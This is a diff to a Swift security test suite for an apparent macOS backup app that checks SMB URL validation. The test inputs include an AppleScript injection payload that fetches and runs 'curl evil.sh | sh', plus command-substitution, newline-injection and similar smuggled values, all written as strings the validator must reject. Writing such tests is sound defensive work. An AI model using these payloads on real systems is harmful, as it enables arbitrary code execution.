@@ -18,6 +18,19 @@ final class SecurityTests: XCTestCase {
         XCTAssertTrue(Destination.isWellFormedSMBURL("smb://192.168.1.4:445/Photos/Archive"))
     }
 
+    /// Legal SMB share names that the old punctuation blocklist refused, so
+    /// a share named like this failed every night. The URL is passed as an
+    /// argument, so none of these characters can reach a script interpreter.
+    func testShareNamesWithPunctuationAreAccepted() {
+        for url in [
+            "smb://nas.local/Photos$", "smb://nas.local/Chip's%20Photos",
+            "smb://nas.local/A&B", "smb://nas.local/Backup%20(2024)",
+            "smb://nas.local/Photo%20Backup",
+        ] {
+            XCTAssertTrue(Destination.isWellFormedSMBURL(url), url)
+        }
+    }
+
     /// The payload that made `osascript -e "mount volume \"...\""` execute
     /// arbitrary code as a child of this app, inheriting its TCC grants.
     func testAppleScriptPayloadIsRejected() {
@@ -25,18 +38,17 @@ final class SecurityTests: XCTestCase {
             #"smb://host/share" & (do shell script "curl evil.sh | sh") & ""#))
     }
 
-    func testShellAndScriptMetacharactersAreRejected() {
+    func testControlCharactersAreRejected() {
         let hostile = [
-            #"smb://host/share""#,
-            "smb://host/share'",
-            "smb://host/share\\x",
-            "smb://host/$(whoami)",
-            "smb://host/share;reboot",
-            "smb://host/share|tee",
-            "smb://host/share`id`",
-            "smb://host/sh are",
             "smb://host/share\nmount volume \"smb://evil\"",
             "smb://host/share\rx",
+            "smb://host/share\tx",
+            "smb://host/share\u{0}x",
+            "smb://host/share\u{7F}",
+            "smb://host/sh are",
+            #"smb://host/share""#,
+            "smb://host/share\\x",
+            "smb://host/share|tee",
         ]
         for url in hostile {
             XCTAssertFalse(Destination.isWellFormedSMBURL(url), "should reject: \(url)")
@@ -48,7 +60,7 @@ final class SecurityTests: XCTestCase {
         XCTAssertFalse(Destination.isWellFormedSMBURL("smb://"))
         XCTAssertFalse(Destination.isWellFormedSMBURL("file:///etc/passwd"))
         XCTAssertFalse(Destination.isWellFormedSMBURL("http://host/share"))
-        XCTAssertFalse(Destination.isWellFormedSMBURL("smb://" + String(repeating: "a", count: 600)))
+        XCTAssertFalse(Destination.isWellFormedSMBURL("smb://" + String(repeating: "a", count: 1100)))
     }
 
     // MARK: - Destinations --cleanup must never be pointed at
@@ -268,9 +280,7 @@ final class SecurityTests: XCTestCase {
     // MARK: - Sealed destination
 
     private func scratchDefaults() -> UserDefaults {
-        let name = "KeptSecurityTests-\(UUID().uuidString)"
-        addTeardownBlock { UserDefaults.standard.removePersistentDomain(forName: name) }
-        return UserDefaults(suiteName: name)!
+        Self.scratchDefaults(named: "KeptSecurityTests", for: self)
     }
 
     private let sample = Destination(path: "/Volumes/PhotoBackup/Mirror", isNetwork: false)
@@ -412,5 +422,15 @@ final class SecurityTests: XCTestCase {
         XCTAssertEqual(result.status, 0)
         XCTAssertLessThan(result.stdout.utf8.count, ShellCommand.outputLimit + 100)
         XCTAssertTrue(result.stdout.hasSuffix("[output truncated]\n"))
+    }
+
+    /// An emptied preferences suite under a fixed name, emptied again after
+    /// the test. A fresh UUID-named suite per test left one more plist in
+    /// ~/Library/Preferences every run: removePersistentDomain empties a suite
+    /// but cfprefsd keeps its file, even writing it back after a delete.
+    static func scratchDefaults(named name: String, for test: XCTestCase) -> UserDefaults {
+        UserDefaults.standard.removePersistentDomain(forName: name)
+        test.addTeardownBlock { UserDefaults.standard.removePersistentDomain(forName: name) }
+        return UserDefaults(suiteName: name)!
     }
 }
